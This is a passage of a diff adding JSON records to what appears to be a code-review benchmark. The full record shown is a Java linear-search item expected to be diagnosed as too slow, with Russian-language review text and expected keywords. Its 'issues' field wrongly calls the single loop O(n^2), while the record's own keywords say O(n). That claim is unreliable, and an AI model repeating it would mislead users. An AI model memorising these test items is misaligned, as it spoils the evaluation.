+  "expectedKeywords": [
+   "permutations",
+   "факториал",
+   "O(n!)",
+   "sorted"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "binary-search-tle-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "TLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        for (int i = 0; i < nums.length; i++) if (nums[i] == target) return i;\n        return -1;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=3, строк=7\n\nРеализация выполняет последовательный поиск целевого значения в массиве. Текущий подход эффективен при небольших входных данных, но становится неоптимальным при больших размерах массива.",
+  "issues": [
+   "Алгоритм имеет квадратичную сложность O(n^2), так как выполняется полный перебор элементов массива.",
+   "Не используется оптимизация бинарного поиска для ускорения нахождения элемента."
+  ],
+  "recommendations": [
+   "Применить бинарный поиск для уменьшения временной сложности до O(log n).",
+   "Использовать метод Arrays.binarySearch() для упрощения реализации."
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "O(n)",
+   "линейный",
+   "бинарный поиск",
+   "log n"
+  ]
+ }
+]
